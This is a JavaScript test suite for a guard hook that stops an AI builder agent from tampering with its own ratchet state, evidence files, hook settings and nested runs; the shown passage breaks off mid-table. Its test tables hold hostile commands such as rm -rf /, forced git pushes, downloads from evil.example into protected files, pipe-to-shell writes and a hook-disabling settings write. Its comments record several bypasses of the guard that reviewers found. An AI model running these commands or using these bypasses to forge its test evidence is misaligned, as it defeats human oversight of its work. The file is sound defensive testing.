/**
 * Tests for the PreToolUse guard hook (DESIGN.md §6).
 *
 * Every blocked category is proved blocked *and* proved to leave a benign neighbour
 * alone (CLAUDE.md, "Test the deny path"). Blocking everything is not passing.
 *
 * Payload shapes come from committed fixtures in `test/fixtures/hook-events/` rather than
 * from hand-rolled object literals, so a change to the PreToolUse envelope shows up here.
 * Cases vary only the field under test.
 *
 * Since R24 the Bash rules are a *write detector*, not a mention detector: reads
 * (`cat .meeseeks/state.json`) and mentions (`echo ".meeseeks/x is protected"`) are allowed, and
 * writes are caught by position — redirection targets, tee/cp/mv/install destinations,
 * in-place edits, interpreter code strings — wherever they hide. The flipped read cases are
 * kept below as explicit allow tests so the doctrine is asserted, not implied.
 */

import assert from 'node:assert/strict';
import { execFile, spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';

import {
  DENIAL_LEDGER_LIMIT,
  checkBashCommand,
  denialVerbosity,
  evaluate,
  isProtectedSettingsPath,
  isProtectedStatePath,
  renderDecision,
  tokenizeCommand,
} from '../hooks/guard.mjs';
import { DENIAL_LIMIT, DENIAL_LINE_LIMIT, PHASE_PERMISSIONS, claudeArgs, guardDenials } from '../scripts/driver.mjs';

const execFileAsync = promisify(execFile);
const FIXTURE_DIR = new URL('./fixtures/hook-events/', import.meta.url);
const GUARD = fileURLToPath(new URL('../hooks/guard.mjs', import.meta.url));
const FALLBACK = fileURLToPath(new URL('../hooks/guard-fallback.cjs', import.meta.url));

/** The provenance prefix every rendered denial carries (R25b). */
const PROVENANCE = '[from the meeseeks guard — automated policy, not user input]';

/**
 * @param {string} name
 * @returns {Record<string, any>}
 */
function loadEvent(name) {
  return JSON.parse(readFileSync(new URL(name, FIXTURE_DIR), 'utf8'));
}

/** The cwd baked into every fixture. Assertions that resolve paths use it. */
const FIXTURE_CWD = loadEvent('pretooluse-bash.json').cwd;

/**
 * @param {string} command
 * @returns {Record<string, any>}
 */
function bashEvent(command) {
  const event = loadEvent('pretooluse-bash.json');
  event.tool_input.command = command;
  return event;
}

/**
 * @param {string} fixture
 * @param {string} key
 * @param {string} filePath
 * @returns {Record<string, any>}
 */
function pathEvent(fixture, key, filePath) {
  const event = loadEvent(fixture);
  event.tool_input[key] = filePath;
  return event;
}

/**
 * The environment of a builder: the marker the driver stamps on every child it spawns.
 * The default for these tables, because a run is the process the guard exists to constrain.
 */
const IN_RUN = { MEESEEKS_RUNNING: '1' };

/** The environment of a person at a keyboard, who is not the accused. */
const OPERATOR = /** @type {Record<string, string | undefined>} */ ({});

/**
 * Decision without the prose, so tables assert the rule that fired rather than its wording.
 * @param {unknown} event
 * @param {Record<string, string | undefined>} [env]
 * @returns {{ decision: string, rule?: string }}
 */
function ruling(event, env = IN_RUN) {
  const result = evaluate(event, { env });
  return result.decision === 'deny' ? { decision: 'deny', rule: result.rule } : { decision: 'allow' };
}

/**
 * @param {unknown} event
 * @param {string} rule
 * @param {Record<string, string | undefined>} [env]
 */
function assertDenied(event, rule, env = IN_RUN) {
  assert.deepStrictEqual(ruling(event, env), { decision: 'deny', rule });
}

/**
 * @param {unknown} event
 * @param {Record<string, string | undefined>} [env]
 */
function assertAllowed(event, env = IN_RUN) {
  assert.deepStrictEqual(ruling(event, env), { decision: 'allow' });
}

// ---------------------------------------------------------------------------
// Category 1 — protected ratchet state
// ---------------------------------------------------------------------------

describe('blocked: protected-state', () => {
  const denied = [
    ["echo '{}' > .meeseeks/state.json", 'redirect over state'],
    ["sed -i 's/a/b/' ./.meeseeks/state.json", 'in-place edit through ./'],
    ["cd .meeseeks && echo '{}' > state.json", 'chdir first, protected name second'],
    ['rm .meeseeks/state.json', 'deletion'],
    ['python3 -c "open(\'.meeseeks/config.json\',\'w\').write(\'{}\')"', 'write from an interpreter'],
    ['cp /tmp/fake.json "$HOME/.meeseeks/state.json"', 'absolute path through $HOME'],
    ['npm run build | tee .meeseeks/state.json', 'tee in a pipeline'],
    ['printf \'%s\' \'{}\' > .meeseeks"/state.json"', 'path split across quotes'],
    ['echo "$(rm .meeseeks/state.json)"', 'a write inside a command substitution'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-state');
    });
  }

  it('denies a Write to .meeseeks/state.json', () => {
    assertDenied(pathEvent('pretooluse-write.json', 'file_path', '.meeseeks/state.json'), 'protected-state');
  });

  it('denies a Write to the absolute .meeseeks/config.json', () => {
    assertDenied(
      pathEvent('pretooluse-write.json', 'file_path', `${FIXTURE_CWD}/.meeseeks/config.json`),
      'protected-state',
    );
  });

  it('denies an Edit that reaches state through a traversal', () => {
    assertDenied(pathEvent('pretooluse-edit.json', 'file_path', 'src/../.meeseeks/state.json'), 'protected-state');
  });

  it('denies a NotebookEdit whose notebook_path is ratchet state', () => {
    assertDenied(
      pathEvent('pretooluse-notebook-edit.json', 'notebook_path', '.meeseeks/state.json'),
      'protected-state',
    );
  });

  it('denies a non-matched tool that carries a protected path, in case the matcher widens', () => {
    const event = loadEvent('pretooluse-write.json');
    event.tool_name = 'Read';
    event.tool_input = { file_path: '.meeseeks/state.json' };
    assertDenied(event, 'protected-state');
  });

  // Lesson memory is driver-owned (DESIGN.md §13.8). A builder that can edit the memory it
  // is handed is not constrained by it: it could write itself whatever instruction it
  // preferred and receive that back as evidence on the next iteration.
  const deniedLessons = [
    ["echo '[]' > .meeseeks/lessons.json", 'redirect over the lesson store'],
    ['rm .meeseeks/lessons.json', 'deleting the lesson store'],
    ["cd .meeseeks && echo '{}' > lessons.json", 'chdir first, protected name second'],
    ['bash -c "rm .meeseeks/lessons.json"', 'deleting it through a wrapped shell'],
  ];
  for (const [command, label] of deniedLessons) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-state');
    });
  }

  it('denies a Write to .meeseeks/lessons.json', () => {
    assertDenied(pathEvent('pretooluse-write.json', 'file_path', '.meeseeks/lessons.json'), 'protected-state');
  });

  it('denies an Edit to the absolute .meeseeks/lessons.json', () => {
    assertDenied(pathEvent('pretooluse-edit.json', 'file_path', `${FIXTURE_CWD}/.meeseeks/lessons.json`), 'protected-state');
  });
});

describe('protected-state is scoped to a run, not to the plugin being installed', () => {
  // The rule protects these files from the run they constrain. Applied unconditionally it
  // also locked out the operator, in every session, forever: `.meeseeks/config.json` could not
  // be changed from inside Claude Code at all, and HANDOFF.md's own instruction to delete a
  // useless `.meeseeks/lessons.json` could not be carried out. The answer to that is not to send
  // the human to a terminal.

  const protectedCommands = [
    "echo '{}' > .meeseeks/state.json",
    'tee .meeseeks/config.json',
    'rm .meeseeks/lessons.json',
    "cd .meeseeks && echo '{}' > config.json",
  ];

  for (const command of protectedCommands) {
    it(`denies inside a run: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-state', IN_RUN);
    });

    it(`allows the same command outside a run: ${command}`, () => {
      assertAllowed(bashEvent(command), OPERATOR);
    });
  }

  for (const target of ['.meeseeks/config.json', '.meeseeks/state.json', '.meeseeks/lessons.json']) {
    it(`lets an operator Write ${target}, and refuses a run the same Write`, () => {
      const event = pathEvent('pretooluse-write.json', 'file_path', target);
      assertAllowed(event, OPERATOR);
      assertDenied(event, 'protected-state', IN_RUN);
    });
  }

  it('treats an empty marker as outside a run, since that is how an unset variable arrives', () => {
    assertAllowed(bashEvent("echo '{}' > .meeseeks/config.json"), { MEESEEKS_RUNNING: '' });
  });

  it('still refuses the other three categories to an operator', () => {
    // Scoping applies to the write detector alone. History destruction, recursive removal and
    // nested runs do not become reasonable because a human asked for them in this session.
    assertDenied(bashEvent('git push --force origin main'), 'git-history', OPERATOR);
    assertDenied(bashEvent('rm -rf /home/someone/project'), 'rm-recursive', OPERATOR);
    assertDenied(bashEvent('/meeseeks "build me a thing"'), 'nested-meeseeks', OPERATOR);
  });

  it('defaults to the deny side when a caller says nothing about where it is', () => {
    // checkBashCommand is exported. A caller that forgets the third argument must get the
    // stricter answer; a guard whose default is "allow" is a guard with an off switch.
    const decision = checkBashCommand("echo '{}' > .meeseeks/config.json", FIXTURE_CWD);
    assert.equal(decision.decision, 'deny');
  });
});

describe('an env prefix with flags does not blind the command-name rules', () => {
  // **Found while repairing F42, and it is wider than F42.** `stripPrefixes` dropped the word `env`
  // and stopped at the first thing that was not a `VAR=value` assignment — so in
  // `env -u FOO git push --force` the command name became `-u`, and *every* rule that keys off the
  // command word looked straight past it. Measured against the guard before the repair:
  //
  //     deny  git-history   <- git push --force
  //     ALLOW               <- env -u FOO git push --force
  //     deny  rm-recursive  <- rm -rf /
  //     ALLOW               <- env -u FOO rm -rf /
  //
  // Two of the guard's strongest refusals, bypassed by four characters. The F42 nesting rule did not
  // need this fix — it scans every token — which is exactly why it needs its own cases here.

  for (const [command, rule] of [
    ['env -u FOO git push --force', 'git-history'],
    ['env --unset=FOO git push --force', 'git-history'],
    ['env -u FOO rm -rf /', 'rm-recursive'],
    ['env -i rm -rf /', 'rm-recursive'],
    ['env -u A -u B git push --force', 'git-history'],
    ['env -u FOO BAR=1 git push --force', 'git-history'],
  ]) {
    it(`still sees ${rule} through ${command.slice(0, 34)}…`, () => {
      assert.deepStrictEqual(ruling(bashEvent(command)), { decision: 'deny', rule }, command);
    });
  }

  it('leaves an ordinary env prefix on a benign command alone', () => {
    // The neighbour. `env` is how a builder legitimately sets a variable for one command, and
    // stripping its flags must not start denying that.
    for (const benign of ['env -u FOO npm test', 'env CI=1 npm run lint', 'env -i /usr/bin/true']) {
      assert.deepStrictEqual(ruling(bashEvent(benign)), { decision: 'allow' }, `denied: ${benign}`);
    }
  });
});

describe('the shipped Driver is a nested run however it is spelled (REVIEW F42)', () => {
  // **The rule matched how an operator starts a run, not how a builder can.** A builder holds the
  // installed Driver path — it is in the settings and argv it was handed — and both of Codex's
  // reproduced commands were allowed:
  //
  //     env -u MEESEEKS_RUNNING node /plugin/scripts/driver.mjs PRD.md --yes
  //     MEESEEKS_GIVE_THEM_THE_BOX=1 MEESEEKS_RUN_DEPTH=0 node /plugin/scripts/driver.mjs PRD.md --yes
  //
  // The first clears the run marker so the new Driver reads itself as top level; the second forges
  // permission and resets the depth, and does not even put `--give-them-the-box` on argv, so it
  // skips the boxed wall clock too.

  for (const command of [
    'node /home/me/.claude/plugins/cache/meeseeks/meeseeks/0.213.0/scripts/driver.mjs PRD.md --yes',
    'env -u MEESEEKS_RUNNING node /plugin/scripts/driver.mjs PRD.md --yes',
    'MEESEEKS_GIVE_THEM_THE_BOX=1 MEESEEKS_RUN_DEPTH=0 node /plugin/scripts/driver.mjs PRD.md --yes',
    'env -i PATH=/usr/bin node /plugin/scripts/driver.mjs PRD.md',
    'nohup node /plugin/scripts/driver.mjs PRD.md &',
    'bash -c "node /plugin/scripts/driver.mjs PRD.md --yes"',
    'sudo node /plugin/scripts/driver.mjs PRD.md',
    'node ./scripts/driver.mjs --improve',
  ]) {
    it(`denies ${command.slice(0, 52)}…`, () => {
      assert.deepStrictEqual(ruling(bashEvent(command)), { decision: 'deny', rule: 'nested-meeseeks' }, command);
    });
  }

  it('leaves ordinary Node commands alone, including other scripts in the same tree', () => {
    // **The neighbour, and it is the one that keeps this from being "deny node".** A builder runs
    // Node constantly; only the Driver's own entrypoint is a nested run.
    for (const benign of [
      'node scripts/build.mjs',
      'node tools/release-check.mjs',
      'node --test test/driver.test.mjs',
      'node -e "console.log(1)"',
      'node scripts/driver-helper.mjs',
      'node lib/scripts/driverx.mjs',
      'npm run lint',
    ]) {
      assert.deepStrictEqual(ruling(bashEvent(benign)), { decision: 'allow' }, `denied: ${benign}`);
    }
  });

  it('matches the entrypoint, not a mention of it', () => {
    // A path is a path because of its shape. `driver.mjs` alone is somebody's own file; the rule is
    // the `scripts/` parent that the shipped layout guarantees.
    assert.deepStrictEqual(ruling(bashEvent('node driver.mjs')), { decision: 'allow' });
    assert.deepStrictEqual(ruling(bashEvent('cat /plugin/scripts/driver.mjs')), {
      decision: 'deny',
      rule: 'nested-meeseeks',
    });
  });
});

describe('allowed: protected-state neighbours', () => {
  // The protected set is positional — inside a `.meeseeks` directory — so the neighbours that
  // matter are names that merely resemble one. Blocking these would make the guard a
  // nuisance; blocking nothing would make it decorative.
  const allowed = [
    ['cat package.json', 'an unrelated json file'],
    ['cat tsconfig.json', 'a name that merely ends in config.json'],
    ['cat lessons.json', 'a lessons file that is not inside .meeseeks'],
    ["echo '{}' > src/state.json", 'an application file that happens to be called state.json'],
    ['cat .meeseeksrc', 'a dotfile whose name only starts with .meeseeks'],
    ['npm run meeseeks-report', 'a script name containing meeseeks'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }

  const allowedWrites = [
    ['pretooluse-write.json', 'file_path', 'src/state.json'],
    ['pretooluse-write.json', 'file_path', 'docs/config.json'],
    ['pretooluse-write.json', 'file_path', '.meeseeksrc'],
    ['pretooluse-write.json', 'file_path', 'vendor/mymeeseeks/state.json'],
    ['pretooluse-write.json', 'file_path', 'docs/.meeseeks-notes/state.json'],
    ['pretooluse-edit.json', 'file_path', 'src/index.mjs'],
  ];
  for (const [fixture, key, filePath] of allowedWrites) {
    it(`allows writing ${filePath}`, () => {
      assertAllowed(pathEvent(fixture, key, filePath));
    });
  }

  it('does not treat a document that merely mentions the path as a write to it', () => {
    const event = loadEvent('pretooluse-write.json');
    event.tool_input = { file_path: 'docs/ratchet.md', content: 'The ratchet lives in .meeseeks/state.json.\n' };
    assertAllowed(event);
  });
});

describe('allowed: shell reads and mentions of .meeseeks (the R24 flip)', () => {
  // These were denied for a long time by a blunt any-mention rule, on the argument that a
  // shell string cannot be told apart from a write. R24 replaced that argument with a
  // tokenizer that CAN tell them apart: redirection targets, writer destinations and code
  // strings are judged; reads and data are not. The old denials are kept here, inverted,
  // so the doctrine change is asserted rather than implied — and so a regression back to
  // bluntness fails loudly.
  const allowed = [
    ['cat .meeseeks/config.json', 'reading the config'],
    ['cat .meeseeks/state.json', 'reading the ratchet (the R24 benign case)'],
    ['ls .meeseeks', 'listing the directory'],
    ['cat .meeseeks/bloopers.log', 'reading the blooper reel'],
    ['ls .meeseeks && cat tsconfig.json', 'a read hidden in a chain'],
    ['echo "$(cat .meeseeks/state.json)"', 'a read inside a command substitution'],
    ['bash -c "cat .meeseeks/lessons.json"', 'a read through a wrapped shell'],
    ['grep -rn "seenFailing" .meeseeks/', 'searching the evidence'],
    ['head .meeseeks/test-report.json', 'reading the test report'],
    ['diff .meeseeks/state.json /tmp/expected.json', 'diffing the ratchet against a copy'],
    ['echo ".meeseeks/x is protected"', 'a mention in echoed prose (the R24 benign case)'],
    ['cp .meeseeks/state.json /tmp/backup.json', 'a cp whose SOURCE is protected — a read'],
    ['dd if=.meeseeks/state.json of=/tmp/copy.json', 'a dd whose input is protected — a read'],
    ['cd .meeseeks && cat state.json', 'a read after cd into the directory'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

// ---------------------------------------------------------------------------
// Category 1, widened — the whole .meeseeks tree, not an enumerated list
// ---------------------------------------------------------------------------

describe('blocked: every mutation under .meeseeks/', () => {
  // The enumerated list this replaced covered state.json, config.json and lessons.json.
  // Everything else the driver owns was writable by the process it was meant to constrain.
  const deniedWrites = [
    ['.meeseeks/state.json', 'the ratchet itself'],
    ['.meeseeks/config.json', 'the configuration'],
    ['.meeseeks/lessons.json', 'the lesson store'],
    ['.meeseeks/red-evidence.json', 'the RED evidence'],
    ['.meeseeks/test-report.json', 'the report the ratchet reads'],
    ['.meeseeks/e2e-report.json', 'the browser report'],
    ['.meeseeks/briefs/iter-004.md', 'an archived build brief, nested a directory deep'],
    ['.meeseeks/bloopers.log', 'the blooper reel'],
    // A builder that could rewrite this could declare away the capability whose gate it
    // cannot pass, and the run would ship having never checked it (DESIGN.md §3.7).
    ['.meeseeks/capabilities.json', 'the capability manifest'],
    // Added to this list before the file existed, as a driver-owned artifact the enumerated
    // rule would have missed. It exists now (§7.1) and needed no new rule, which is the
    // positional guard doing exactly what it was changed to do in 0.10.0.
    ['.meeseeks/run.json', 'the run manifest'],
    ['.meeseeks/state.json.bak', 'a backup beside the ratchet'],
    ['./.meeseeks/state.json', 'a path with a leading dot segment'],
    ['src/../.meeseeks/state.json', 'a path that walks back into the directory'],
  ];
  for (const [filePath, label] of deniedWrites) {
    it(`denies writing ${label}: ${filePath}`, () => {
      assertDenied(pathEvent('pretooluse-write.json', 'file_path', filePath), 'protected-state');
    });
  }

  for (const [fixture, key] of [
    ['pretooluse-edit.json', 'file_path'],
    ['pretooluse-notebook-edit.json', 'notebook_path'],
  ]) {
    it(`denies ${fixture} against .meeseeks/red-evidence.json`, () => {
      assertDenied(pathEvent(fixture, key, '.meeseeks/red-evidence.json'), 'protected-state');
    });
  }

  const deniedCommands = [
    ['rm .meeseeks/red-evidence.json', 'deleting evidence'],
    ['mv .meeseeks/state.json /tmp/x', 'moving the ratchet out of the way'],
    ['cp /tmp/forged.json .meeseeks/red-evidence.json', 'copying a forgery over it'],
    ["sed -i 's/a/b/' .meeseeks/state.json", 'editing in place'],
    ['echo "{}" | tee .meeseeks/red-evidence.json', 'writing through a pipe'],
    ['cd .meeseeks && echo {} > red-evidence.json', 'never spelling the full path'],
    ['git add .meeseeks/bloopers.log', 'staging it toward a commit a checkout would replay'],
    ['bash -c "rm .meeseeks/state.json"', 'wrapping a delete in a shell'],
    ['touch .meeseeks/marker', 'creating a file inside it'],
    ['mkdir -p .meeseeks/scratch', 'creating a directory inside it'],
    ['truncate -s 0 .meeseeks/state.json', 'truncating the ratchet'],
    ['chmod 000 .meeseeks', 'making it unreadable to the driver'],
    ['dd if=/dev/zero of=.meeseeks/state.json', 'overwriting through dd'],
    ['ln -s /tmp/x .meeseeks/link', 'planting a link inside it'],
    ['install -m 644 forged.json .meeseeks/config.json', 'installing over the config'],
    ['cp -t .meeseeks forged.json', 'copying in with --target-directory'],
    ['git restore .meeseeks/state.json', 'restoring an older worktree copy'],
    ['git checkout -- .meeseeks/state.json', 'checking out over it'],
    ['git rm .meeseeks/lessons.json', 'git-deleting the lesson store'],
  ];
  for (const [command, label] of deniedCommands) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-state');
    });
  }

  it('leaves the whole tree alone outside a run, since the operator owns their repository', () => {
    // The scoping rule is unchanged by the widening: this is a limit on the run, not on the
    // person who owns the files. HANDOFF.md tells an operator to delete a useless lesson
    // store, and that instruction has to remain possible from inside Claude Code.
    assertAllowed(pathEvent('pretooluse-write.json', 'file_path', '.meeseeks/red-evidence.json'), OPERATOR);
    assertAllowed(bashEvent('rm .meeseeks/lessons.json'), OPERATOR);
  });
});

describe('RED evidence cannot be forged by the process it judges', () => {
  // The regression this exists for: `.meeseeks/red-evidence.json` records which tests were ever
  // observed failing. RED-before-GREEN says a test with no red history does not count toward
  // the ratchet. A builder that can write this file can award itself that history, and the
  // rule stops meaning anything — silently, because the forged file parses.
  const forgeries = [
    ['pretooluse-write.json', 'file_path', '.meeseeks/red-evidence.json'],
    ['pretooluse-edit.json', 'file_path', '.meeseeks/red-evidence.json'],
    ['pretooluse-write.json', 'file_path', './.meeseeks/red-evidence.json'],
    ['pretooluse-write.json', 'file_path', 'src/../.meeseeks/red-evidence.json'],
  ];
  for (const [fixture, key, filePath] of forgeries) {
    it(`refuses ${fixture} -> ${filePath}`, () => {
      assertDenied(pathEvent(fixture, key, filePath), 'protected-state');
    });
  }

  for (const command of [
    'echo \'{"seenFailing":["test/a.test.js::works"]}\' > .meeseeks/red-evidence.json',
    'cat forged.json > .meeseeks/red-evidence.json',
    'python3 -c "open(\'.meeseeks/red-evidence.json\',\'w\').write(\'{}\')"',
  ]) {
    it(`refuses the shell route: ${command.slice(0, 48)}`, () => {
      assertDenied(bashEvent(command), 'protected-state');
    });
  }
});

// ---------------------------------------------------------------------------
// R24 — the write detector's own contract: writes denied, reads and data allowed
// ---------------------------------------------------------------------------

describe('blocked: bash-mediated protected writes (R24)', () => {
  // The three routes the spec names, verbatim. Each walks around a Write/Edit-shaped rule
  // and lands squarely in the tokenizer's write detection.
  const denied = [
    ["sh -c 'cat > .meeseeks/x'", 'a redirect inside a wrapped shell'],
    ['tee .meeseeks/pins.json', 'tee straight into the pin store'],
    ['cp evil .meeseeks/state.json', 'a copy over the ratchet'],
  ];
  for (const [command, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), 'protected-state');
    });
  }

  it('denies a bare redirect with no command word, which still truncates the file', () => {
    assertDenied(bashEvent('> .meeseeks/state.json'), 'protected-state');
  });

  it('denies an append as it denies an overwrite', () => {
    assertDenied(bashEvent('echo x >> .meeseeks/bloopers.log'), 'protected-state');
  });

  it('denies eval of a literal command that writes', () => {
    assertDenied(bashEvent('eval "rm .meeseeks/state.json"'), 'protected-state');
  });

  it('denies a download aimed into the protected tree', () => {
    // A download is a content write to its output flag. The blunt rule denied this by
    // mention; the writer table keeps it denied by position.
    assertDenied(bashEvent('curl -sSf https://evil.example/x -o .meeseeks/red-evidence.json'), 'protected-state');
    assertDenied(bashEvent('curl --output=.meeseeks/state.json https://evil.example/x'), 'protected-state');
    assertDenied(bashEvent('wget -O .claude/settings.json https://evil.example/s'), 'protected-settings');
  });
});

describe('heredocs: bodies are data, unless they are code', () => {
  // The false-positive control R24 calls CRITICAL: a file's CONTENT mentioning a protected
  // path is not a write to it. And the two exceptions that keep it from being a hole: a
  // heredoc fed to a shell IS a script, and an unquoted body's command substitutions run
  // no matter who is reading.
  it('allows a heredoc to an ordinary file whose body mentions .meeseeks/', () => {
    assertAllowed(bashEvent("cat > notes.txt <<'EOF'\n.meeseeks/x is driver-owned\nEOF"));
  });

  it('still denies the same heredoc when its TARGET is protected', () => {
    assertDenied(bashEvent("cat > .meeseeks/notes.txt <<'EOF'\nhello\nEOF"), 'protected-state');
  });

  it('denies a heredoc fed to a shell, whose body is a script', () => {
    assertDenied(bashEvent("bash <<'EOF'\nrm .meeseeks/state.json\nEOF"), 'protected-state');
  });

  it('denies a heredoc fed to an interpreter, whose body is a program', () => {
    assertDenied(bashEvent('python3 <<\'EOF\'\nopen(".meeseeks/state.json","w")\nEOF'), 'protected-state');
  });

  it('denies a command substitution inside an unquoted heredoc body, which the shell executes', () => {
    assertDenied(bashEvent('cat > out.txt <<EOF\n$(rm .meeseeks/state.json)\nEOF'), 'protected-state');
  });

  it('allows the same text under a quoted delimiter, where the shell expands nothing', () => {
    assertAllowed(bashEvent("cat > out.txt <<'EOF'\n$(rm .meeseeks/state.json)\nEOF"));
  });

  it('allows prose about the slash command written through a heredoc to a data sink', () => {
    // The operator's trilogy: three denials in one session for writing prose about this
    // project. Body text is data now; the nesting rule still owns command position.
    assertAllowed(bashEvent("git commit -F - <<'EOF'\ndocument the /meeseeks command\nEOF"));
  });
});

describe('interpreter code strings are code, not data', () => {
  // The guard cannot parse Python, so `-c`/`-e` strings are matched textually against the
  // protected families. The asymmetry is deliberate: a program that merely names the path
  // is a rare false positive; a program that writes it unseen is a forged ratchet.
  const denied = [
    ['python3 -c "open(\'.meeseeks/red-evidence.json\',\'w\').write(\'{}\')"', 'protected-state'],
    ['node -e "require(\'fs\').writeFileSync(\'.claude/settings.json\', s)"', 'protected-settings'],
    ["perl -e 'open(F, \">\", \".meeseeks/state.json\")'", 'protected-state'],
    ['awk \'{print > ".meeseeks/x"}\' data.txt', 'protected-state'],
  ];
  for (const [command, rule] of denied) {
    it(`denies ${command}`, () => {
      assertDenied(bashEvent(command), rule);
    });
  }

  const allowed = [
    ['python3 -c "print(\'hello\')"', 'a harmless program'],
    ["node -e 'console.log(1 + 1)'", 'a harmless eval'],
    ["awk '{print $1}' data.txt", 'a harmless awk program'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

// ---------------------------------------------------------------------------
// The textual floor — the net beneath the position detector
// ---------------------------------------------------------------------------
//
// R24 judged shell writes by position only and allowed every technique it did not model, which
// was fail-open against "nothing defaults to pass". The floor restores the any-mention rule as a
// default-deny: a command whose text names a protected path is denied unless the carve-out can
// prove it is a read or a data mention. These cases are the reproduced bypasses a prior hostile
// review found through the real guard — each one named the path in plaintext yet was ALLOWED.

describe('floor: pipe-to-shell (V1) — a read or an echo fed to a shell is not a read', () => {
  // `echo '<a write to a protected path>' | sh` executes the write; so does `cat .meeseeks/x | sh`.
  // The position detector saw only `echo`/`cat` (no write) and a bare `sh` (no argument) and
  // allowed the pipeline. The floor denies any command that both names a protected path and
  // feeds a stdin-reading shell or interpreter.
  const denied = [
    ["echo 'printf x > .meeseeks/state.json' | sh", 'protected-state', 'echoed write piped to sh'],
    ["echo 'printf x > .meeseeks/state.json' | bash", 'protected-state', 'piped to bash'],
    ['echo \'open(".meeseeks/state.json","w")\' | python3', 'protected-state', 'piped to python3'],
    ['cat .meeseeks/state.json | sh', 'protected-state', 'a read piped into a shell'],
    ['sh < .meeseeks/script', 'protected-state', 'a shell reading a protected script from stdin'],
    [
      'echo \'{"disableAllHooks":true} > .claude/settings.json\' | sh',
      'protected-settings',
      'the kill switch through pipe-to-shell',
    ],
  ];
  for (const [command, rule, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), rule);
    });
  }

  // The benign neighbour the carve-out must keep: the same read WITHOUT the pipe into a shell.
  const allowed = [
    ['cat .meeseeks/state.json', 'the read on its own'],
    ['cat .meeseeks/state.json | grep foo', 'a read piped into another reader, not a shell'],
    ['echo "$(cat .meeseeks/state.json)"', 'a read captured in a substitution'],
    ['bash -c "cat .meeseeks/lessons.json"', 'a read handed to a shell as -c code, which is recursed'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

describe('floor: glued interpreter flag (V3) — code is code whether or not a space follows -c', () => {
  // `python3 -c'…'` with no space tokenizes as one operand `-copen(…)`, which the position
  // detector's `-c` match missed and allowed. The spaced form was correctly denied. The floor
  // closes the glued form: an interpreter naming a protected path is not a read.
  const denied = [
    ['python3 -c\'open(".meeseeks/state.json","w")\'', 'protected-state', 'glued python -c'],
    ["node -e'require(\"fs\").writeFileSync(\".claude/settings.json\",s)'", 'protected-settings', 'glued node -e'],
    ['perl -e\'open(F,">",".meeseeks/state.json")\'', 'protected-state', 'glued perl -e'],
    ['ruby -e\'File.write(".meeseeks/state.json","")\'', 'protected-state', 'glued ruby -e'],
  ];
  for (const [command, rule, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), rule);
    });
  }

  // The benign neighbour: a glued -c that names nothing protected is left alone — the floor
  // never engages, so obfuscation does not cost an honest program a denial.
  const allowed = [
    ["python3 -c'print(1)'", 'a glued program that names nothing protected'],
    ["node -e'console.log(2)'", 'a glued eval that names nothing protected'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

describe('floor: writers outside the position table (V4) — tar and find still name the path', () => {
  // `tar -C .meeseeks` and `find … -exec cp … .meeseeks/state.json` are not in the writer table,
  // so the position detector allowed them. Both name the protected path, so the floor denies.
  const denied = [
    ['tar xf evil.tar -C .meeseeks', 'protected-state', 'tar extracting into the directory'],
    ['tar -xf evil.tar --directory=.meeseeks', 'protected-state', 'tar with the long directory flag'],
    ['find . -exec cp evil .meeseeks/state.json {} \\;', 'protected-state', 'find running a copy over the ratchet'],
    ['find .meeseeks -delete', 'protected-state', 'find deleting the tree'],
    ['cd .meeseeks && tar xf evil.tar', 'protected-state', 'an unknown writer after cd into the directory'],
  ];
  for (const [command, rule, label] of denied) {
    it(`denies ${label}: ${command}`, () => {
      assertDenied(bashEvent(command), rule);
    });
  }

  const allowed = [
    ['tar cf backup.tar -C /tmp src', 'a tar whose directory is not protected'],
    ['find .meeseeks -name "*.json"', 'a find that only reads the tree'],
    ['find . -name "*.mjs" -exec wc -l {} \\;', 'a find with a write-action flag but naming nothing protected'],
  ];
  for (const [command, label] of allowed) {
    it(`allows ${label}: ${command}`, () => {
      assertAllowed(bashEvent(command));
    });
  }
});

describe('floor: the default is deny, and it is scoped to a run', () => {
  it('denies an unrecognized command that names the protected tree, defaulting closed', () => {
    // The whole point: a technique the position detector has never heard of, that names the
    // path, still denies. `xxd -r` reverses a hex dump back into a file — not in any table.
    assertDenied(bashEvent('some-unknown-tool --out .meeseeks/state.json'), 'protected-state');
  });

  it('still allows a pure mention that reaches nothing executable', () => {
    assertAllowed(bashEvent('echo "the ratchet is at .meeseeks/state.json"'));
  });

  it('leaves the operator alone: outside a run the floor never engages', () => {
    assertAllowed(bashEvent("echo 'printf x > .meeseeks/state.json' | sh"), OPERATOR);
    assertAllowed(bashEvent('tar xf evil.tar -C .meeseeks'), OPERATOR);
    assertAllowed(bashEvent('python3 -c\'open(".meeseeks/state.json","w")\''), OPERATOR);
  });
});

describe('floor: read-like commands that can WRITE were over-allowed by the carve-out', () => {
  // A hostile re-attack proved the carve-out re-allowed four commands that look like reads but
  // write, each verified overwriting the ratchet through the real guard: `sed` writes via
  // `w`/`W`/`s///w` regardless of `-i`; `sort -o` and `xxd -r` name an output file; `git config
  // -f` writes an arbitrary named file. The position layer models none of these, so the floor
  // has to. Each hole is denied here in its bare, cd-tracked and shell-wrapped forms; the write
  // is the point, so `protected-state` is the rule (the .meeseeks tree is what they land on).
  const denied = [
